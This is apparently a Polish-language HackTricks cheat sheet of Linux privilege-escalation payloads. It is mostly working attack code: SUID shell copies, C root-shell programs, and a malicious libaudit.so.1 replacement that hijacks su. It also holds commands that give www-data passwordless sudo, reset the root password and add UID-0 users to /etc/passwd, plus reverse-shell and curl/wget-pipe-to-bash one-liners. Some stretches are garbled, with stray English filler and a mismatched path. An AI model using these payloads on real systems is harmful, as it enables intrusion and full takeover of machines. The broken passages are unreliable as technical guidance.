# Payloady do wykonania

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć, jak Twoja **firma jest reklamowana w HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do repozytorium [hacktricks](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Bash
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## Wykonywanie payloadów

W celu eskalacji uprawnień, możemy wykorzystać różne payloady. Poniżej przedstawiam kilka popularnych payloadów, które można wykorzystać w celu wykonania kodu na zdalnym systemie:

### 1. Reverse Shell

Payload ten umożliwia zdalne połączenie z systemem i uruchomienie powłoki na zdalnym hoście. Możemy użyć narzędzi takich jak Netcat lub Ncat, aby nawiązać połączenie i uzyskać zdalny dostęp do systemu.

```bash
nc -e /bin/sh <adres_ip> <port>
```

### 2. Bash One-Liner

Ten payload pozwala na wykonanie jednolinijkowego polecenia bash na zdalnym systemie. Możemy użyć tego payloadu, aby uruchomić dowolne polecenie na zdalnym hoście.

```bash
bash -c 'command'
```

### 3. Python One-Liner

Podobnie jak w przypadku Bash One-Liner, ten payload pozwala na wykonanie jednolinijkowego polecenia Python na zdalnym systemie.

```bash
python -c 'command'
```

### 4. PHP One-Liner

Ten payload pozwala na wykonanie jednolinijkowego polecenia PHP na zdalnym systemie.

```bash
php -r 'command'
```

### 5. Perl One-Liner

Podobnie jak w przypadku poprzednich payloadów, ten payload pozwala na wykonanie jednolinijkowego polecenia Perl na zdalnym systemie.

```bash
perl -e 'command'
```

### 6. Ruby One-Liner

Ten payload pozwala na wykonanie jednolinijkowego polecenia Ruby na zdalnym systemie.

```bash
ruby -e 'command'
```

### 7. PowerShell One-Liner

Ten payload pozwala na wykonanie jednolinijkowego polecenia PowerShell na zdalnym systemie.

```bash
powershell -c 'command'
```

### 8. Wget

Ten payload pozwala na pobranie pliku z internetu i uruchomienie go na zdalnym systemie.

```bash
wget -O- <url> | bash
```

### 9. cURL

Podobnie jak w przypadku Wget, ten payload pozwala na pobranie pliku z internetu i uruchomienie go na zdalnym systemie.

```bash
curl <url> | bash
```

### 10. SCP

Ten payload pozwala na skopiowanie pliku z lokalnego systemu na zdalny system i uruchomienie go.

```bash
scp <plik> <użytkownik>@<adres_ip>:<ścieżka_docelowa> && ssh <użytkownik>@<adres_ip> '<ścieżka_docelowa>/<plik>'
```

Pamiętaj, że wykorzystywanie tych payloadów w celach nielegalnych lub bez zgody właściciela systemu jest niezgodne z prawem. Używaj ich tylko w ramach legalnych działań, takich jak testowanie penetracyjne lub w celach edukacyjnych.
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## Nadpisywanie pliku w celu eskalacji uprawnień

### Powszechne pliki

* Dodaj użytkownika z hasłem do _/etc/passwd_
* Zmień hasło wewnątrz _/etc/shadow_
* Dodaj użytkownika do sudoers w _/etc/sudoers_
* Wykorzystaj Docker poprzez gniazdo dockera, zwykle w _/run/docker.sock_ lub _/var/run/docker.sock_

### Nadpisywanie biblioteki

Sprawdź bibliotekę używaną przez pewny plik binarny, w tym przypadku `/bin/su`:
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
W tym przypadku spróbujmy podszyć się pod `/lib/x86_64-linux-gnu/libaudit.so.1`.\
Więc sprawdź funkcje tej biblioteki używane przez binarny plik **`su`**:
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
Symbole `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` i `audit_fd` prawdopodobnie pochodzą z biblioteki libaudit.so.1. Ponieważ biblioteka libaudit.so.1 zostanie nadpisana przez złośliwą bibliotekę współdzieloną, te symbole powinny być obecne w nowej bibliotece współdzielonej, w przeciwnym razie program nie będzie w stanie znaleźć symbolu i zakończy działanie.
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
Teraz, po prostu wywołując **`/bin/su`**, uzyskasz powłokę jako root.

## Skrypty

Czy możesz sprawić, żeby root coś wykonał?

### **www-data do sudoers**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
To change the root password, follow these steps:

1. Log in as the root user or switch to the root user using the `su` command.
2. Run the `passwd` command to change the root password.
3. Enter the new password when prompted.
4. Confirm the new password by entering it again.

After completing these steps, the root password will be changed.
```bash
echo "root:hacked" | chpasswd
```
### Dodaj nowego użytkownika root do pliku /etc/passwd

```bash
echo 'newroot:x:0:0:root:/root:/bin/bash' >> /etc/passwd
```
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć swoją **firmę reklamowaną w HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do repozytorium [hacktricks](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
